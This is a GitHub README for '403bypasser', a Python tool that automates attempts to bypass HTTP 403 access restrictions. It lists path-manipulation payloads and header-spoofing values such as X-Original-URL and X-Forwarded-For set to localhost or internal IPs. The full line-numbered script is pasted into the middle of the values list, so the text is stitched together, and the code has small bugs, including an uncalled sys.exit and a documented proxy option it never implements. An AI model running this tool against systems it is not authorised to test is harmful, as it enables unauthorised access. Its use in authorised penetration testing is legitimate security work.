[![forthebadge made-with-python](http://ForTheBadge.com/images/badges/made-with-python.svg)](https://www.python.org/)
![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)

# 403bypasser

![Banner](https://github.com/yunemse48/403bypasser/blob/master/img/banner_v2.png?raw=true)

## Türkçe
**403bypasser**, hedef sayfalardaki erişim kontrolü kısıtlamalarını aşmak için kullanılan teknikleri otomatikleştirir. Bu araç geliştirilmeye devam edecektir, katkılara açıktır. 

## English 

**403bypasser** automates the techniques used to circumvent access control restrictions on target pages. **403bypasser** will continue to be improved and it is open to contributions.

## Installation

1. Clone the repository to your machine. `git clone https://github.com/yunemse48/403bypasser.git`
2. Install required modules by running the code `pip install -r requirements.txt`
3. READY!

## Usage

**Arguments:**<br>

| Argument | Description | Examples | Note |
| -------- | ----------- | ------- | ---- |
| -u | single URL to scan | http://example.com or http://example.com/ | All these example usages are interpreted in the same way |
| -U | path to list of URLs | ./urllist.txt, ../../urllist.txt, etc.  | Just provide the path where the file is located :) |
| -d | single directory to scan | admin or /admin or admin/ or /admin/ | All these example usages are interpreted in the same way |
| -D | path to list of directories | ./dirlist.txt, ../../dirlist.txt, etc.  | Just provide the path where the file is located :) |
| -P | Send request via proxy (like burp) | 127.0.0.1:8080  | Provides the ability to send the request to a proxy, such as burp.  |

**Usage 1:** `python3 403bypasser.py -u https://example.com -d /secret`<br>
**Usage 2:** `python3 403bypasser.py -u https://example.com -D dirlist.txt`<br>
**Usage 3:** `python3 403bypasser.py -U urllist.txt -d /secret`<br>
**Usage 4:** `python3 403bypasser.py -U urllist.txt -D dirlist.txt`<br>
**Useage 5 (With proxy):** `python3 403bypasser2.py -u https://exmaple.com -d /secret/ -p 127.0.0.1:8080`

**IMPORTANT NOTE:** All the followings are interpreted the same. Therefore, which pattern you use is just a matter of preference.
- `python3 403bypasser.py -u https://example.com -d secret`<br>
- `python3 403bypasser.py -u https://example.com -d /secret`<br>
- `python3 403bypasser.py -u https://example.com -d /secret/`<br>
- `python3 403bypasser.py -u https://example.com -d secret/`<br>
- `python3 403bypasser.py -u https://example.com/ -d secret`<br>
***ALL THE SAME!***

> Since Python is a cross-platform language, one can run this program on different operating systems. 

## Output

The output of the program is saved (in the current directory) in a file with the name of the domain name given as input.<br>
For example: <br>
`python3 403bypasser.py -u https://example.com -d /secret` is given. Then the output is saved to `example.txt` in the current directory.
***

## Release Notes
**Changes in v2.0**: Considerable changes have been done in this version. The project is completely moved to Python 3 from Bash. New and wide variety of techniques have been added.<br>
<br>
**Changes in v1.1:** It's now possible to pass files (lists) to 403bypasser as input via arguments. Furthermore, two more test cases added: 
poisoning with 1)`X-Original-URL` and 2)`X-Rewrite-URL` headers. 

***

## To-Do List
- [ ] GUI
- [ ] Add Rate-Limit / Threads Option
- [ ] Add an Option for Scan Types (fast, normal, aggressive or only path manipulation / header manipulation)
- [ ] Export cURL Command for Each Request
- [ ] Add Parameters to Save Output According to HTTP Status Codes
- [ ] Add Parameters to Save Output According to Page Size Anomalies

## Which Cases Does This Tool Check?

### 1. Request Method Manipulation
- Convert GET request to POST request

### 2. Path Manipulation
- `/%2e/secret`
- `/secret/`
- `/secret..;/` 
- `/secret/..;/`
- `/secret%20`  
- `/secret%09`
- `/secret%00`
- `/secret.json`
- `/secret.css`
- `/secret.html`
- `/secret?`
- `/secret??`
- `/secret???`
- `/secret?testparam`
- `/secret#`
- `/secret#test`
- `/secret/.`
- `//secret//`
- `/./secret/./`

### 3. Overriding the Target URL via Non-Standard Headers
- `X-Original-URL: /secret`
- `X-Rewrite-URL: /secret`

### 4. Other Headers & Values 
**Headers:** 
- `X-Custom-IP-Authorization`
- `X-Forwarded-For`
- `X-Forward-For`
- `X-Remote-IP`
- `X-Originating-IP`
- `X-Remote-Addr`
- `X-Client-IP`
- `X-Real-IP`

**Values:**
- `localhost`
- `localhost:80`
- `localhost:443`
- `127.0.0.1`
- `127.0.0.1:80`
- `127.0.0.1:443`
- `2130706433`
- `0x7F000001`
- `0177.0000.0000.0001`
- `0`
- `127.1`
- `10.0.0.0`
- `10.0.0.1`
- `172.16.0.0`
- `172.16.0.1`
- `192.168.1.0`import requests, sys, argparse, validators, os, tldextract
2
from colorama import init, Fore, Style
3
from pyfiglet import Figlet
4
​
5
# INITIALISE COLORAMA
6
init()
7
​
8
# DISPLAY BANNER -- START
9
custom_fig = Figlet(font='slant')
10
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('-------------') + Style.RESET_ALL)
11
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('403bypasser') + Style.RESET_ALL)
12
print(Fore.GREEN + Style.BRIGHT + "____________________ Yunus Emre SERT ____________________\n")
13
print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "-----> Twitter   : https://twitter.com/yunem_se\n")
14
print(Fore.MAGENTA + Style.BRIGHT + "-----> GitHub    : https://github.com/yunemse48\n")
15
print(Fore.MAGENTA + Style.BRIGHT + "-----> LinkedIn  : https://www.linkedin.com/in/yunus-emre-sert-9102a9135/\n")
16
print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('-------------') + Style.RESET_ALL)
17
# DISPLAY BANNER -- END
18
​
19
# HANDLE ARGUMENTS -- START
20
parser = argparse.ArgumentParser()
21
parser.add_argument("-u", "--url", type=str, help="single URL to scan, ex: http://example.com")
22
parser.add_argument("-U", "--urllist", type=str, help="path to list of URLs, ex: urllist.txt")
23
parser.add_argument("-d", "--dir", type=str, help="Single directory to scan, ex: /admin", nargs="?", const="/")
24
parser.add_argument("-D", "--dirlist", type=str, help="path to list of directories, ex: dirlist.txt")
25
​
26
args = parser.parse_args()
27
# HANDLE ARGUMENTS -- END
28
​
29
​
30
​
31
class Arguments():
32
    def __init__(self, url, urllist, dir, dirlist):
33
        self.url = url
34
        self.urllist = urllist
35
        self.dir = dir
36
        self.dirlist = dirlist
37
        self.urls = []
38
        self.dirs = []
39
        
40
        self.checkURL()
41
        self.checkDir()
42
    
43
    def return_urls(self):
44
        return self.urls
45
    
46
    def return_dirs(self):
47
        return self.dirs
48
    
49
    def checkURL(self):
50
        if self.url:
51
            if not validators.url(self.url):
52
                print("You must specify a valid URL for -u (--url) argument! Exitting...\n")
53
                sys.exit
54
            
55
            if self.url.endswith("/"):
56
                self.url = self.url.rstrip("/")
57
            
58
            self.urls.append(self.url)
59
        elif self.urllist:
60
            if not os.path.exists(self.urllist):
61
                print("The specified path to URL list does not exist! Exitting...\n")
62
                sys.exit()
63
            
64
            with open(self.urllist, 'r') as file:
65
                temp = file.readlines()
66
            
67
            for x in temp:
68
                self.urls.append(x.strip())
69
        else:
70
            print("Please provide a single URL or a list either! (-u or -U)\n")
71
            sys.exit()
72
    
73
    def checkDir(self):
74
        if self.dir:
75
            if not self.dir.startswith("/"): 
76
                self.dir = "/" + self.dir
77
            
78
            if self.dir.endswith("/") and self.dir != "/":
79
                self.dir = self.dir.rstrip("/")
80
            self.dirs.append(self.dir)
81
        elif self.dirlist:
82
            if not os.path.exists(self.dirlist):
83
                print("The specified path to directory list does not exist! Exitting...\n")
84
                sys.exit()
85
            
86
            with open(self.dirlist, 'r') as file:
87
                temp = file.readlines()
88
            
89
            for x in temp:
90
                self.dirs.append(x.strip())
91
        else:
92
            self.dir = "/"
93
​
94
​
95
class PathRepository():
96
    def __init__(self, path):
97
        self.path = path
98
        self.newPaths = []
99
        self.newHeaders = []
100
        self.rewriteHeaders = []
101
        
102
        self.createNewPaths()
103
        self.createNewHeaders()
104
    
105
    def createNewPaths(self):
106
        self.newPaths.append(self.path)
107
        
108
        pairs = [["/", "//"], ["/.", "/./"]]
109
        
110
        leadings = ["/%2e"]
111
        
112
        trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00", 
113
                    ".json", ".css", ".html", "?", "??", "???", 
114
                    "?testparam", "#", "#test", "/."]
115
        
116
        for pair in pairs:
117
            self.newPaths.append(pair[0] + self.path + pair[1])
118
        
119
        for leading in leadings:
120
            self.newPaths.append(leading + self.path)
121
        
122
        for trailing in trailings:
123
            self.newPaths.append(self.path + trailing)
124
    
125
    def createNewHeaders(self):
126
        headers_overwrite = ["X-Original-URL", "X-Rewrite-URL"]
127
        
128
        headers = ["X-Custom-IP-Authorization", "X-Forwarded-For", 
129
                "X-Forward-For", "X-Remote-IP", "X-Originating-IP", 
130
                "X-Remote-Addr", "X-Client-IP", "X-Real-IP"]
131
        
132
        values = ["localhost", "localhost:80", "localhost:443", 
133
                "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", 
134
                "2130706433", "0x7F000001", "0177.0000.0000.0001", 
135
                "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", 
136
                "172.16.0.1", "192.168.1.0", "192.168.1.1"]
137
        
138
        for header in headers:
139
            for value in values:
140
                self.newHeaders.append({header : value})
141
        
142
        for element in headers_overwrite:
143
            self.rewriteHeaders.append({element : self.path})
144
​
145
​
146
class Query():
147
    def __init__(self, url, dir, dirObject):
148
        self.url = url
149
        self.dir = dir          # call pathrepo by this
150
        self.dirObject = dirObject
151
        self.domain = tldextract.extract(self.url).domain
152
    
153
    
154
    
155
    def checkStatusCode(self, status_code):
156
        if status_code == 200 or status_code == 201:
157
            colour = Fore.GREEN + Style.BRIGHT
158
        elif status_code == 301 or status_code == 302:
159
            colour = Fore.BLUE + Style.BRIGHT
160
        elif status_code == 403 or status_code == 404:
161
            colour = Fore.MAGENTA + Style.BRIGHT
162
        elif status_code == 500:
163
            colour = Fore.RED + Style.BRIGHT
164
        else:
165
            colour = Fore.WHITE + Style.BRIGHT
166
        
167
        return colour
168
    
169
    def writeToFile(self, array):
170
        with open(self.domain + ".txt", "a") as file:
171
            for line in array:
172
                file.write(line + "\n")
173
    
174
    def manipulateRequest(self):
175
        print((" Target URL: " + self.url + "\tTarget Path: " + self.dir + " ").center(121, "="))
176
        results = []
177
        p = requests.post(self.url + self.dir)
178
        
179
        colour = self.checkStatusCode(p.status_code)
180
        reset = Style.RESET_ALL
181
        
182
        line_width = 100
183
        target_address = "POST --> " + self.url + self.dir
184
        info = f"STATUS: {colour}{p.status_code}{reset}\tSIZE: {len(p.content)}"
185
        info_pure = f"STATUS: {p.status_code}\tSIZE: {len(p.content)}"
186
        remaining = line_width - len(target_address)
187
        
188
        print("\n" + target_address + " " * remaining + info)
189
        
190
        results.append(target_address + " " * remaining + info_pure)
191
        
192
        self.writeToFile(results)
193
        
194
        self.manipulatePath()
195
    
196
    def manipulatePath(self):
197
        results = []
198
        reset = Style.RESET_ALL
199
        line_width = 100
200
        
201
        for path in self.dirObject.newPaths:
202
            r = requests.get(self.url + path)
203
            
204
            colour = self.checkStatusCode(r.status_code)
205
            
206
            target_address = "GET --> " + self.url + path
207
            info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
208
            info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
209
            remaining = line_width - len(target_address)
210
            
211
            print(target_address + " " * remaining + info)
212
            
213
            results.append(target_address + " " * remaining + info_pure)
214
        
215
        self.writeToFile(results)
216
        self.manipulateHeaders()
217
    
218
    def manipulateHeaders(self):
219
        results = []
220
        line_width = 100
221
        
222
        for header in self.dirObject.newHeaders:
223
            r = requests.get(self.url + self.dir, headers=header)
224
            
225
            colour = self.checkStatusCode(r.status_code)
226
            reset = Style.RESET_ALL
227
            
228
            target_address = "GET --> " + self.url + self.dir
229
            info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
230
            info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
231
            remaining = line_width - len(target_address)
232
            
233
            print("\n" + target_address + " " * remaining + info)
234
            print(f"Header= {header}")
235
            
236
            results.append("\n" + target_address + " " * remaining + info_pure + f"\nHeader= {header}")
237
        self.writeToFile(results)
238
        
239
        results_2 = []
240
        for header in self.dirObject.rewriteHeaders:
241
            r = requests.get(self.url, headers=header)
242
            
243
            colour = self.checkStatusCode(r.status_code)
244
            reset = Style.RESET_ALL
245
            
246
            target_address = "GET --> " + self.url
247
            info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
248
            info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
249
            remaining = line_width - len(target_address)
250
            
251
            print("\n" + target_address + " " * remaining + info)
252
            print(f"Header= {header}")
253
            
254
            results_2.append("\n" + target_address + " " * remaining + info_pure + f"\nHeader= {header}")
255
        
256
        self.writeToFile(results_2)
257
​
258
​
259
class Program():
260
    def __init__(self, urllist, dirlist):
261
        self.urllist = urllist
262
        self.dirlist = dirlist
263
    
264
    def initialise(self):
265
        for u in self.urllist:
266
            for d in self.dirlist:
267
                if d != "/":
268
                    dir_objname = d.lstrip("/")
269
                else:
270
                    dir_objname = "_rootPath"
271
                locals()[dir_objname] = PathRepository(d)
272
                domain_name = tldextract.extract(u).domain
273
                locals()[domain_name] = Query(u, d, locals()[dir_objname])
274
                locals()[domain_name].manipulateRequest()
275
​
276
argument = Arguments(args.url, args.urllist, args.dir, args.dirlist)
277
program = Program(argument.return_urls(), argument.return_dirs())
278
​
279
program.initialise()
280

- `192.168.1.1`
